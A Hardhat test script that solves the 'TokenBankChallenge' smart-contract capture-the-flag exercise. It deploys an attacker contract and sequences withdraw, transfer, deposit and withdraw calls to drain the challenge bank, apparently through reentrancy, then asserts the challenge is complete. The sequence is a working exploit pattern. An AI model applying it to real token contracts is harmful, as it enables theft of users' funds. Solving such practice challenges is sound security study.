import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { BigNumber, Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

const TOTAL_TOKENS_SUPPLY = 1000000;

describe('TokenBankChallenge', () => {
  let target: Contract;
  let token: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    const [targetFactory, tokenFactory] = await Promise.all([
      ethers.getContractFactory('TokenBankChallenge', deployer),
      ethers.getContractFactory('SimpleERC223Token', deployer),
    ]);

    target = await targetFactory.deploy(attacker.address);

    await target.deployed();

    const tokenAddress = await target.token();

    token = await tokenFactory.attach(tokenAddress);

    await token.deployed();

    target = target.connect(attacker);
    token = token.connect(attacker);
  });

  it('exploit', async () => {
    const attackFactory = await ethers.getContractFactory('TokenBankAttacker');
    const attackContract = await attackFactory.deploy(target.address, token.address);
    await attackContract.deployed();

    const tokens = BigNumber.from(10).pow(18).mul(500000);

    let tx;

    // Withdraw tokens: Bank -> Attacker EOA
    tx = await target.connect(attacker).withdraw(tokens);
    await tx.wait();

    // Transfer tokens: Attacker EOA -> Attacker Contract
    tx = await token.connect(attacker)['transfer(address,uint256)'](attackContract.address, tokens);
    await tx.wait();

    // Deposit tokens: Attacker Contract -> Bank
    tx = await attackContract.connect(attacker).deposit();
    await tx.wait();

    tx = await attackContract.connect(attacker).withdraw();
    await tx.wait();

    const decimals = BigNumber.from(10).pow(18);
    const targetBalance = await token.balanceOf(target.address);
    console.log('targetBalance', targetBalance.div(decimals));
    const attackContractBalance = await token.balanceOf(attackContract.address);
    console.log('attackContractBalance', attackContractBalance.div(decimals));

    expect(await target.isComplete()).to.be.true;
  });
});
